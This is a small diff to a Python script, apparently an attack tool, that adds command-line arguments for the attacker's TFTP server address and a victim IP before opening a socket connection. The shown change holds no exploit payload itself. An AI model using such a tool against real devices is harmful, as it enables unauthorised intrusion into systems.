@@ -23,6 +23,10 @@ victim_ip = '10.1.2.3'
 # IP of your TFTP server
 attack_ip = '192.168.2.200'
 
+if(len(sys.argv) == 3):
+   attack_ip = sys.argv[1]
+   victim_ip = sys.argv[2]
+
 conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 conn.settimeout(5)
 try:
